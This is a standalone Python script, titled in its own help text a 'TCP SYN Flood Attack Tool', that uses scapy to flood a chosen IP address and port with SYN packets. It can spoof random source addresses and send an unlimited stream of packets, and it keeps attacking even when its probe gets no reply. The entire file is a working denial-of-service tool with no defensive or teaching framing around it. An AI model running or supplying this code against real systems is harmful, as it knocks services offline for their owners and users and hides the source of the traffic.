#!/usr/bin/env python3
from scapy.all import *
from scapy.arch.windows import get_windows_if_list
import argparse
import random
import sys
import time
import ctypes

def generate_random_ip():
    """Generate a random IP address for spoofing"""
    return ".".join(map(str, (random.randint(0, 255) for _ in range(4))))

def syn_flood(target_ip, target_port, count=1000, interval=0.01, spoof=False, verbose=False):
    """
    Simulate a TCP SYN flood attack
    :param target_ip: Target IP address
    :param target_port: Target port number
    :param count: Number of packets to send (0 for unlimited)
    :param interval: Delay between packets in seconds
    :param spoof: Whether to spoof source IP addresses
    :param verbose: Show packet information
    """
    sent = 0
    print(f"[*] Starting TCP SYN flood attack on {target_ip}:{target_port}")
    
    try:
        while True:
            src_ip = generate_random_ip() if spoof else None
            src_port = random.randint(1024, 65535)
            
            # Craft TCP SYN packet
            ip_layer = IP(dst=target_ip, src=src_ip)
            tcp_layer = TCP(sport=src_port, dport=target_port, flags="S")
            packet = ip_layer/tcp_layer
            
            if verbose:
                print(f"Sending packet #{sent+1}: {packet.summary()}")
            
            # Send packet
            try:
                send(packet, verbose=0)
                sent += 1
            except Exception as e:
                print(f"[!] Error sending packet: {e}")
                time.sleep(1)
                continue
            
            if count > 0 and sent >= count:
                break
                
            time.sleep(interval)
            
    except KeyboardInterrupt:
        print("\n[!] Attack interrupted by user")
    
    print(f"[*] Attack completed. Total packets sent: {sent}")

def is_admin():
    """Check if running as administrator"""
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def list_interfaces():
    """List available network interfaces"""
    print("\nAvailable network interfaces:")
    for iface in get_windows_if_list():
        print(f"  - {iface['name']} (Desc: {iface['description']})")
    print()

if __name__ == "__main__":
    # Check for admin privileges
    if os.name == 'nt' and not is_admin():
        print("[!] Administrator privileges required on Windows")
        print("[!] Please run the script as Administrator")
        sys.exit(1)

    parser = argparse.ArgumentParser(description="TCP SYN Flood Attack Tool")
    parser.add_argument("target_ip", help="Target IP address")
    parser.add_argument("target_port", type=int, help="Target port number")
    parser.add_argument("-c", "--count", type=int, default=1000, 
                       help="Number of packets to send (0 for unlimited)")
    parser.add_argument("-i", "--interval", type=float, default=0.01,
                       help="Interval between packets in seconds")
    parser.add_argument("-s", "--spoof", action="store_true",
                       help="Spoof source IP addresses")
    parser.add_argument("-v", "--verbose", action="store_true",
                       help="Verbose output")
    parser.add_argument("-iface", "--interface", default=None,
                       help="Specify network interface (recommended on Windows)")
    
    args = parser.parse_args()
    
    # Windows-specific configuration
    if os.name == 'nt':
        if args.interface:
            conf.iface = args.interface
        conf.use_pcap = True
        
        # List interfaces if none specified
        if not conf.iface:
            print("[!] No network interface specified")
            list_interfaces()
            sys.exit(1)
    
    # Verify target port is valid
    if not (0 < args.target_port <= 65535):
        print("[!] Invalid target port number (1-65535)")
        sys.exit(1)
    
    print("[*] Starting TCP SYN flood attack (Ctrl+C to stop)")
    
    # Send test SYN packet first
    print("[*] Sending test SYN packet...")
    try:
        test_syn = sr1(IP(dst=args.target_ip)/TCP(dport=args.target_port, flags="S"), 
                      timeout=2, verbose=0)
        if test_syn and test_syn.haslayer(TCP) and test_syn.getlayer(TCP).flags & 0x12:  # SYN-ACK
            print("[+] Target responded with SYN-ACK! Starting flood...")
        else:
            print("[!] Target didn't respond properly (may be filtered)")
            print("[!] Continuing attack anyway...")
    except Exception as e:
        print(f"[!] Error sending test SYN: {e}")
        print("[!] Continuing attack anyway...")
    
    syn_flood(
        target_ip=args.target_ip,
        target_port=args.target_port,
        count=args.count,
        interval=args.interval,
        spoof=args.spoof,
        verbose=args.verbose
    )